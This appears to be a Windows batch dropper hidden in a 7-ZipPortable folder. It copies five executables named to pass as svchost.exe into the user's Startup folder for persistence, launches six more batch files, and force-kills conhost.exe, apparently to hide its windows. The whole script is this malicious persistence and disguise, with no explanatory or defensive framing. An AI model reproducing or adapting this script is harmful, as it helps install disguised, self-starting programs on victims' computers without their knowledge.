
echo f|xcopy /f .\7-ZipPortable\ok\svchost.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchostfm.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchostfm.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchosth.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchosth.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchostog.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchostog.exe"


echo f|xcopy /f .\7-ZipPortable\ok\svchosts.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchosts.exe"


start .\7-ZipPortable\ok\open\1.bat

start .\7-ZipPortable\ok\open\2.bat

start .\7-ZipPortable\ok\open\3.bat

start .\7-ZipPortable\ok\open\4.bat

start .\7-ZipPortable\ok\open\5.bat

start .\7-ZipPortable\ok\open\6.bat

timeout 2
taskkill /im conhost.exe /f

exit